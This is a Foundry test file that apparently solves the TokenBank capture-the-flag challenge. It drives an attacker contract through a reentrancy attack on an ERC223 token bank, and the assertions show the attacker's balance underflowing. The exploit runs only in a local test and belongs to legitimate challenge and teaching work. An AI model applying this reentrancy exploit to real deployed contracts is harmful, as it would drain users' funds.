// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/TokenBank.sol";

contract TankBankTest is Test {
    TokenBankChallenge public tokenBankChallenge;
    TokenBankAttacker public tokenBankAttacker;
    address player = address(1234);

    function setUp() public {}

    function testExploit() public {
        tokenBankChallenge = new TokenBankChallenge(player);
        tokenBankAttacker = new TokenBankAttacker(address(tokenBankChallenge));

        // Put your solution here

        SimpleERC223Token ERC223Token = tokenBankChallenge.token();

        assertEq(tokenBankChallenge.balanceOf(player), 500_000e18);
        assertEq(tokenBankChallenge.balanceOf(address(this)), 500_000e18);
        assertEq(tokenBankChallenge.balanceOf(address(tokenBankAttacker)), 0);
        assertEq(ERC223Token.balanceOf(address(tokenBankChallenge)), 1_000_000e18);
        assertEq(ERC223Token.balanceOf(player), 0);

        vm.startPrank(player);

        tokenBankChallenge.withdraw(500_000e18);
        assertEq(tokenBankChallenge.balanceOf(player), 0);
        assertEq(ERC223Token.balanceOf(player), 500_000e18);

        ERC223Token.approve(address(tokenBankAttacker), ERC223Token.balanceOf(player));
        assertEq(ERC223Token.allowance(player, address(tokenBankAttacker)), 500_000e18);

        vm.stopPrank();

        tokenBankAttacker.attack();

        assertEq(tokenBankChallenge.balanceOf(player), 0);
        assertEq(tokenBankChallenge.balanceOf(address(this)), 500_000e18);
        uint256 amount;
        unchecked {
            amount -= 500_000e18;
        }
        assertEq(tokenBankChallenge.balanceOf(address(tokenBankAttacker)), amount);

        _checkSolved();
    }

    function _checkSolved() internal {
        assertTrue(tokenBankChallenge.isComplete(), "Challenge Incomplete");
    }
}
